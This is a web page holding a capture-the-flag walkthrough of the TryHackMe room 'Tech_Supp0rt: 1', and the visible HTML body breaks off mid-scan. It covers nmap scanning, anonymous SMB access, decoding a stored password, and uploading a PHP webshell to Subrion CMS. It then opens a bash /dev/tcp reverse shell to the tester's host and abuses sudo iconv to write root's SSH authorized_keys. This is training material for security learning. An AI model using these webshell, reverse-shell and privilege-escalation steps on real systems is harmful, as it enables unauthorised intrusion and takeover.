<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>geobour98</title><meta name=keywords content><meta name=description content="ðŸ“† 06/01/2023 - geobour98 âŒš 7 min
Introduction This is a TryHackMe room which can be found at: Tech_Supp0rt: 1
Hack into the scammer&rsquo;s under-development website to foil their plans.
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 10.10.182.202  geobour98@kali:~$ nmap -p- -T4 -v 10.10.182.202 Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-05 19:55 EET Nmap scan report for 10."><meta name=author content><link rel=canonical href=https://geobour98.com/write-ups/thm/techsupp0rt1/><meta name=google-site-verification content="G-VH8LGJGC27"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.min.c88963fe2d79462000fd0fb1b3737783c32855d340583e4523343f8735c787f0.css integrity="sha256-yIlj/i15RiAA/Q+xs3N3g8MoVdNAWD5FIzQ/hzXHh/A=" rel="preload stylesheet" as=style><link rel=preload href=logo.png as=image><script defer crossorigin=anonymous src=/assets/js/highlight.min.4dcb3c4f38462f66c6b6137227726f5543cb934cca9788f041c087e374491df2.js integrity="sha256-Tcs8TzhGL2bGthNyJ3JvVUPLk0zKl4jwQcCH43RJHfI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://geobour98.com/favicon/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://geobour98.com/favicon/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://geobour98.com/favicon/favicon-32x32.png><link rel=apple-touch-icon href=https://geobour98.com/favicon/apple-touch-icon.png><link rel=mask-icon href=https://geobour98.com/logo.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-VH8LGJGC27"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-VH8LGJGC27",{anonymize_ip:!1})}</script><meta property="og:title" content="TryHackMe - Tech_Supp0rt: 1"><meta property="og:description" content="ðŸ“† 06/01/2023 - geobour98 âŒš 7 min
Introduction This is a TryHackMe room which can be found at: Tech_Supp0rt: 1
Hack into the scammer&rsquo;s under-development website to foil their plans.
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 10.10.182.202  geobour98@kali:~$ nmap -p- -T4 -v 10.10.182.202 Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-05 19:55 EET Nmap scan report for 10."><meta property="og:type" content="article"><meta property="og:url" content="https://geobour98.com/write-ups/thm/techsupp0rt1/"><meta property="og:image" content="https://geobour98.com/47"><meta property="article:section" content="write-ups"><meta property="og:site_name" content="geobour98"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://geobour98.com/47"><meta name=twitter:title content="TryHackMe - Tech_Supp0rt: 1"><meta name=twitter:description content="ðŸ“† 06/01/2023 - geobour98 âŒš 7 min
Introduction This is a TryHackMe room which can be found at: Tech_Supp0rt: 1
Hack into the scammer&rsquo;s under-development website to foil their plans.
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 10.10.182.202  geobour98@kali:~$ nmap -p- -T4 -v 10.10.182.202 Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-05 19:55 EET Nmap scan report for 10."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Write-ups","item":"https://geobour98.com/write-ups/"},{"@type":"ListItem","position":2,"name":"TryHackMe - Tech_Supp0rt: 1","item":"https://geobour98.com/write-ups/thm/techsupp0rt1/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe - Tech_Supp0rt: 1","name":"TryHackMe - Tech_Supp0rt: 1","description":"ðŸ“† 06/01/2023 - geobour98 âŒš 7 min\nIntroduction This is a TryHackMe room which can be found at: Tech_Supp0rt: 1\nHack into the scammer\u0026rsquo;s under-development website to foil their plans.\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 10.10.182.202  geobour98@kali:~$ nmap -p- -T4 -v 10.10.182.202 Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-05 19:55 EET Nmap scan report for 10.","keywords":[],"articleBody":"ðŸ“† 06/01/2023 - geobour98 âŒš 7 min\nIntroduction This is a TryHackMe room which can be found at: Tech_Supp0rt: 1\nHack into the scammerâ€™s under-development website to foil their plans.\nReconnaissance \u0026 Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 10.10.182.202  geobour98@kali:~$ nmap -p- -T4 -v 10.10.182.202 Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-05 19:55 EET Nmap scan report for 10.10.182.202 (10.10.182.202) Host is up (0.086s latency). Not shown: 65531 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 139/tcp open netbios-ssn 445/tcp open microsoft-ds  Nmap done: 1 IP address (1 host up) scanned in 62.06 seconds Perform aggressive nmap scan to enable OS detection, default scripts and version detection on the found ports.\n  Command: sudo nmap -A -sC -p 22,80,139,445 -v 10.10.182.202  geobour98@kali:~$ sudo nmap -A -sC -p 22,80,139,445 -v 10.10.182.202 Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-05 19:58 EET Nmap scan report for 10.10.182.202 (10.10.182.202) Host is up (0.080s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 108af572d7f97e14a5c54f9e978b3d58 (RSA) | 256 7f10f557413c71dbb55bdb75c976305c (ECDSA) |_ 256 6b4c23506f36007ca67c1173c1a8600c (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.18 (Ubuntu) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 5.4 (99%), Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (94%), Linux 3.16 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Android 7.1.1 - 7.1.2 (92%), Linux 3.13 - 4.4 (92%), Linux 3.2 - 3.16 (92%), Linux 3.2 - 3.5 (92%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel  Host script results: | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: techsupport | NetBIOS computer name: TECHSUPPORT\\x00 | Domain name: \\x00 | FQDN: techsupport |_ System time: 2023-01-05T23:28:27+05:30 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 311: |_ Message signing enabled but not required | smb2-time: | date: 2023-01-05T17:58:24 |_ start_date: N/A |_clock-skew: mean: -1h49m59s, deviation: 3h10m29s, median: 0s  TRACEROUTE (using port 139/tcp) HOP RTT ADDRESS 1 67.41 ms 10.8.0.1 (10.8.0.1) 2 74.48 ms 10.10.182.202 (10.10.182.202)  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 24.59 seconds   Command: smbclient -L \\\\\\\\10.10.182.202\\\\ -N  geobour98@kali:~$ smbclient -L \\\\\\\\10.10.182.202\\\\ -N   Sharename Type Comment  --------- ---- -------  print$ Disk Printer Drivers  websvr Disk  IPC$ IPC IPC Service (TechSupport server (Samba, Ubuntu)) Reconnecting with SMB1 for workgroup listing.   Server Comment  --------- -------   Workgroup Master  --------- -------  WORKGROUP We will try to view the contents of the websvr share and download any existing files.\n  Command: smbclient \\\\\\\\10.10.182.202\\\\websvr -N  geobour98@kali:~$ smbclient \\\\\\\\10.10.182.202\\\\websvr -N Try \"help\" to get a list of possible commands. smb: \\ dir  . D 0 Sat May 29 10:17:38 2021  .. D 0 Sat May 29 10:03:47 2021  enter.txt N 273 Sat May 29 10:17:38 2021   8460484 blocks of size 1024. 5678116 blocks available smb: \\ get enter.txt getting file \\enter.txt of size 273 as enter.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec) Below we see the contents of the enter.txt:\nGOALS ===== 1)Make fake popup and host it online on Digital Ocean server 2)Fix subrion site, /subrion doesn't work, edit from panel 3)Edit wordpress website  IMP === Subrion creds |-admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula] Wordpress creds |- The password can be found by the Magic operation from: https://gchq.github.io/CyberChef/ or decoded from base58, then decoded from base32 and finally decoded from base64.\n  Command: echo \"7sKvntXdPEJaxazce9PXi24zaFrLiKWCk\" | base58 -d | base32 -d | base64 -d  geobour98@kali:~$ echo \"7sKvntXdPEJaxazce9PXi24zaFrLiKWCk\" | base58 -d | base32 -d | base64 -d Scam2021 So the credentials for subrion site are: admin:Scam2021.\nExploitation If we navigate to http://10.10.182.202/subrion we are redirected, so we can try the panel as stated at enter.txt. So, we navigate to http://10.10.182.202/subrion/panel, we see a login page and log in with the found credentials admin:Scam2021.\nThis is an instance of Subrion CMS v 4.2.1, so we can search for public exploits with searchsploit on that version.\n  Command: searchsploit subrion 4.2.1  geobour98@kali:~$ searchsploit subrion 4.2.1 -------------------------------------------------------------------------------------------- ---------------------------------  Exploit Title | Path -------------------------------------------------------------------------------------------- --------------------------------- Subrion 4.2.1 - 'Email' Persistant Cross-Site Scripting | php/webapps/47469.txt Subrion CMS 4.2.1 - 'avatar[path]' XSS | php/webapps/49346.txt Subrion CMS 4.2.1 - Arbitrary File Upload | php/webapps/49876.py Subrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin) | php/webapps/50737.txt Subrion CMS 4.2.1 - Cross-Site Scripting | php/webapps/45150.txt -------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results The most interesting is php/webapps/49876.py. After reading the code, we should upload a webshell with .phar extension, which is basically a PHP file.\nSo, we create a file called cmd.phar with contents:\nphp system($_REQUEST['cmd']); ?In order to upload the file, we select Content, then Uploads and click on Upload files. Then, we select the cmd.phar file.\nAfter uploading the file, it is shown in the Dashboard. We right-click the file and select Get info. We are provided with a link for the uploaded file which is: http://10.10.182.202/subrion/uploads/cmd.phar.\nSo, to verify command execution we navigate to http://10.10.182.202/subrion/uploads/cmd.phar?cmd=id.\nThe output is: uid=33(www-data) gid=33(www-data) groups=33(www-data), so we can get a reverse shell through Burp Suite.\nRefresh the page and Intercept with Burp. Then replace the id command with bash -c 'exec bash -i \u0026 /dev/tcp/10.8.16.74/443 0\u00261' and URL-encode it with Ctrl-U.\nSo the request should look like this:\nGET /subrion/uploads/cmd.phar?cmd=bash+-c+'exec+bash+-i+%26+/dev/tcp/10.8.16.74/443+0%261' HTTP/1.1 Host: 10.10.182.202 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: INTELLI_06c8042c3d=2vg4i4doqntpnij1dihsfbsqd3; loader=loaded Upgrade-Insecure-Requests: 1 Then, open a netcat listener and we have a reverse shell as www-data.\ngeobour98@kali:~$ nc -lvnp 443 listening on [any] 443 ... connect to [10.8.16.74] from (UNKNOWN) [10.10.182.202] 51060 bash: cannot set terminal process group (1381): Inappropriate ioctl for device bash: no job control in this shell www-data@TechSupport:/var/www/html/subrion/uploads$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 'import pty;pty.spawn(\"/bin/bash\")' www-data@TechSupport:/var/www/html/subrion/uploads$ ^Z zsh: suspended nc -lvnp 443  geobour98@kali:~$ stty raw -echo;fg [1] + continued nc -lvnp 443  =xterm-256color www-data@TechSupport:/var/www/html/subrion/uploads$ stty rows 27 cols 126 Now we have a fully interactive TTY shell.\nAfter enumeration, we find an interesting file wp-config.php at /var/www/html/wordpress, which contains potential database credentials.\nwww-data@TechSupport:/var/www/html/wordpress$ cat wp-config.php  /** The name of the database for WordPress */ define( 'DB_NAME', 'wpdb' );  /** MySQL database username */ define( 'DB_USER', 'support' );  /** MySQL database password */ define( 'DB_PASSWORD', '[REDACTED]' );  We can try the found password for the user scamsite, that can be found from either /etc/passwd or /home/scamsite.\nThe password is valid, so we can login with SSH as the user scamsite.\n  Command: ssh scamsite@10.10.182.202  geobour98@kali:~$ The authenticity of host '10.10.182.202 (10.10.182.202)' can't be established. ED25519 key fingerprint is SHA256:J/HR9GKX4ReRvs4I9fnMwmJrOTL5B3skZ4owxwxWoyM. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.182.202' (ED25519) to the list of known hosts. scamsite@10.10.182.202's password: Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)   * Documentation: https://help.ubuntu.com  * Management: https://landscape.canonical.com  * Support: https://ubuntu.com/advantage   120 packages can be updated. 88 updates are security updates.   Last login: Fri May 28 23:30:20 2021 scamsite@TechSupport:~$ Now we are the user scamsite.\nPrivilege Escalation After executing the command: sudo -l we see that we can execute /usr/bin/iconv as root without being asked for root password.\nWe can easily read the root.txt file by executing the following command found at: https://gtfobins.github.io/gtfobins/iconv/#sudo.\n  Command: sudo /usr/bin/iconv -f 8859_1 -t 8859_1 \"/root/root.txt\"  scamsite@TechSupport:~$ sudo /usr/bin/iconv -f 8859_1 -t 8859_1 \"/root/root.txt\" [REDACTED]  .notice{--root-color:#444;--root-background:#eff;--title-color:#fff;--title-background:#7bd;--warning-title:#c33;--warning-content:#fee;--info-title:#fb7;--info-content:#fec;--note-title:#6be;--note-content:#e7f2fa;--tip-title:#5a5;--tip-content:#efe}@media (prefers-color-scheme:dark){.notice{--root-color:#ddd;--root-background:#eff;--title-color:#fff;--title-background:#7bd;--warning-title:#800;--warning-content:#400;--info-title:#a50;--info-content:#420;--note-title:#069;--note-content:#023;--tip-title:#363;--tip-content:#121}}body.dark .notice{--root-color:#ddd;--root-background:#eff;--title-color:#fff;--title-background:#7bd;--warning-title:#800;--warning-content:#400;--info-title:#a50;--info-content:#420;--note-title:#069;--note-content:#023;--tip-title:#363;--tip-content:#121}.notice{padding:18px;line-height:24px;margin-bottom:24px;border-radius:4px;color:var(--root-color);background:var(--root-background)}.notice p:last-child{margin-bottom:0}.notice-title{margin:-18px -18px 12px;padding:4px 18px;border-radius:4px 4px 0 0;font-weight:700;color:var(--title-color);background:var(--title-background)}.notice.warning .notice-title{background:var(--warning-title)}.notice.warning{background:var(--warning-content)}.notice.info .notice-title{background:var(--info-title)}.notice.info{background:var(--info-content)}.notice.note .notice-title{background:var(--note-title)}.notice.note{background:var(--note-content)}.notice.tip .notice-title{background:var(--tip-title)}.notice.tip{background:var(--tip-content)}.icon-notice{display:inline-flex;align-self:center;margin-right:8px}.icon-notice img,.icon-notice svg{height:1em;width:1em;fill:currentColor}.icon-notice img,.icon-notice.baseline svg{top:.125em;position:relative} Note\nRoot Shell We could read rootâ€™s private SSH key and log in with SSH providing the id_rsa, but we are asked for password.\nSo, we can create our SSH keys, put the public key in /root/.ssh/authorized_keys and log in as root.\n   Command: ssh-keygen -t rsa  geobour98@kali:~$ ssh-keygen -t rsa Generating public/private rsa key pair. Enter file in which to save the key (/home/geobour98/.ssh/id_rsa): ./id_rsa Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in ./id_rsa Your public key has been saved in ./id_rsa.pub The key fingerprint is: SHA256:ycc38+YTseWCT87FV6KlIX8V5Y9gFdLRRBgg1hSI0YA geobour98@kali The key's randomart image is: +---[RSA 3072]----+ | .o=o+=+=O=| | E ..o..ooo.| | o o| | . o....+.=| | S oo+*.Oo| | . .=+* =| | *o+.| | o= | | .. | +----[SHA256]-----+ Two files are created: id_rsa (private key) and id_rsa.pub (public key).\nWe copy the contents of id_rsa.pub and run as the scamsite user in the SSH session the following command using iconv again but with the option -o in order to create a file.\nscamsite@TechSupport:~$ echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEXbJCblmDCS9cWXLzrVNFMCH9YyZJPpik7xKp9fXrWn+9BjuIpCKSxJ5h1bz6TrSbDJB/tzszA8Y3GFwbT3N7frcD5FGnLKhhX9EFHMEFNJSaeLsLfPsfAL5+G9LTd2L27m227enaKOOpLUmPNuRLAduiAXLja7cTl19/9iuwtHGRMaLiXb2nVE+SuGpo5eO89xz0VsoYTXZXiiGBT8dn4Mi3inMs7EY6DLNXRU0uWM+cC/HBrmEIPZlphiXoqeY3kQv2vadYGDE22OhhkBAhhz97KC/2w/RUpfEmwgWncxZ124zRUj0insM9r/8Vmf0To7/ejkhp6UCQuOvMW67yJbQ7CCNxfggG3dGLbQkTC1lAjgb+pIg6rRfU+2w2nrol0PWFoCAmMaGUNQdJGtia8l6XMh8BkKYasV4SkIDC1ZbVM5vK8bRdneNtb4guZubKJbxVuDLQO61sxRcS0k0orDQ8zNNODloMFUKbYjrLjMhCRjihYd0JCNxbMWYnZqE=\" | sudo /usr/bin/iconv -f 8859_1 -t 8859_1 -o \"/root/.ssh/authorized_keys\" Then, we can login with our private SSH key as the root user.\n  Command: ssh -i id_rsa root@10.10.182.202  geobour98@kali:~$ ssh -i id_rsa root@10.10.182.202 Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)   * Documentation: https://help.ubuntu.com  * Management: https://landscape.canonical.com  * Support: https://ubuntu.com/advantage   120 packages can be updated. 88 updates are security updates.   Last login: Sun Nov 21 11:17:57 2021 root@TechSupport:~# whoami root Proof of Concept (PoC image): linux web smbclient base64 subrion php file-upload wordpress ssh sudo iconv  ","wordCount":"1563","inLanguage":"en","datePublished":"0001-01-01T00:00:00Z","dateModified":"0001-01-01T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://geobour98.com/write-ups/thm/techsupp0rt1/"},"publisher":{"@type":"Organization","name":"geobour98","logo":{"@type":"ImageObject","url":"https://geobour98.com/favicon/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://geobour98.com/ accesskey=h title="geobour98 (Alt + H)"><img src=https://geobour98.com/logo.png alt=logo aria-label=logo height=35>geobour98</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://geobour98.com/about/ title=About><span>About</span></a></li><li><a href=https://geobour98.com/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://geobour98.com/write-ups/ title=Write-ups><span>Write-ups</span></a></li><li><a href=https://geobour98.com/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://geobour98.com/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>TryHackMe - Tech_Supp0rt: 1</h1><div class=post-meta></div></header><div class=post-content><p>ðŸ“† 06/01/2023 - geobour98<br>âŒš 7 min</p><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2><p>This is a <strong>TryHackMe</strong> room which can be found at:
<a href=https://tryhackme.com/room/techsupp0rt1 target=_blank style=color:#e30f0f>Tech_Supp0rt: 1</a></p><p>Hack into the scammer&rsquo;s under-development website to foil their plans.</p><h2 id=reconnaissance--scanning>Reconnaissance & Scanning<a hidden class=anchor aria-hidden=true href=#reconnaissance--scanning>#</a></h2><p>Perform <code>nmap</code> scan to identify open ports and services.</p><ul><li>Command: <code>nmap -p- -T4 -v 10.10.182.202</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ nmap -p- -T4 -v 10.10.182.202
</span></span><span style=display:flex><span>Starting Nmap 7.93 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2023-01-05 19:55 EET
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.182.202 <span style=color:#f92672>(</span>10.10.182.202<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.086s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65531</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT    STATE SERVICE
</span></span><span style=display:flex><span>22/tcp  open  ssh
</span></span><span style=display:flex><span>80/tcp  open  http
</span></span><span style=display:flex><span>139/tcp open  netbios-ssn
</span></span><span style=display:flex><span>445/tcp open  microsoft-ds
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 62.06 seconds
</span></span></code></pre></div><p>Perform aggressive <code>nmap</code> scan to enable OS detection, default scripts and version detection on the found ports.</p><ul><li>Command: <code>sudo nmap -A -sC -p 22,80,139,445 -v 10.10.182.202</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ sudo nmap -A -sC -p 22,80,139,445 -v 10.10.182.202 
</span></span><span style=display:flex><span>Starting Nmap 7.93 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2023-01-05 19:58 EET
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.182.202 <span style=color:#f92672>(</span>10.10.182.202<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.080s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT    STATE SERVICE     VERSION
</span></span><span style=display:flex><span>22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>2048</span> 108af572d7f97e14a5c54f9e978b3d58 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 7f10f557413c71dbb55bdb75c976305c <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 6b4c23506f36007ca67c1173c1a8600c <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp  open  http        Apache httpd 2.4.18 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>|_http-title: Apache2 Ubuntu Default Page: It works
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.18 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style=color:#f92672>(</span>workgroup: WORKGROUP<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu <span style=color:#f92672>(</span>workgroup: WORKGROUP<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Warning: OSScan results may be unreliable because we could not find at least <span style=color:#ae81ff>1</span> open and <span style=color:#ae81ff>1</span> closed port
</span></span><span style=display:flex><span>Aggressive OS guesses: Linux 5.4 <span style=color:#f92672>(</span>99%<span style=color:#f92672>)</span>, Linux 3.10 - 3.13 <span style=color:#f92672>(</span>95%<span style=color:#f92672>)</span>, ASUS RT-N56U WAP <span style=color:#f92672>(</span>Linux 3.4<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>94%<span style=color:#f92672>)</span>, Linux 3.16 <span style=color:#f92672>(</span>94%<span style=color:#f92672>)</span>, Linux 3.1 <span style=color:#f92672>(</span>93%<span style=color:#f92672>)</span>, Linux 3.2 <span style=color:#f92672>(</span>93%<span style=color:#f92672>)</span>, Android 7.1.1 - 7.1.2 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>, Linux 3.13 - 4.4 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>, Linux 3.2 - 3.16 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>, Linux 3.2 - 3.5 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>No exact OS matches <span style=color:#66d9ef>for</span> host <span style=color:#f92672>(</span>test conditions non-ideal<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Network Distance: <span style=color:#ae81ff>2</span> hops
</span></span><span style=display:flex><span>Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb-os-discovery: 
</span></span><span style=display:flex><span>|   OS: Windows 6.1 <span style=color:#f92672>(</span>Samba 4.3.11-Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   Computer name: techsupport
</span></span><span style=display:flex><span>|   NetBIOS computer name: TECHSUPPORT<span style=color:#ae81ff>\x</span><span style=color:#ae81ff>00</span>
</span></span><span style=display:flex><span>|   Domain name: <span style=color:#ae81ff>\x</span><span style=color:#ae81ff>00</span>
</span></span><span style=display:flex><span>|   FQDN: techsupport
</span></span><span style=display:flex><span>|_  System time: 2023-01-05T23:28:27+05:30
</span></span><span style=display:flex><span>| smb-security-mode: 
</span></span><span style=display:flex><span>|   account_used: guest
</span></span><span style=display:flex><span>|   authentication_level: user
</span></span><span style=display:flex><span>|   challenge_response: supported
</span></span><span style=display:flex><span>|_  message_signing: disabled <span style=color:#f92672>(</span>dangerous, but default<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   311: 
</span></span><span style=display:flex><span>|_    Message signing enabled but not required
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2023-01-05T17:58:24
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>|_clock-skew: mean: -1h49m59s, deviation: 3h10m29s, median: 0s
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>TRACEROUTE <span style=color:#f92672>(</span>using port 139/tcp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>HOP RTT      ADDRESS
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>   67.41 ms 10.8.0.1 <span style=color:#f92672>(</span>10.8.0.1<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span>   74.48 ms 10.10.182.202 <span style=color:#f92672>(</span>10.10.182.202<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 24.59 seconds
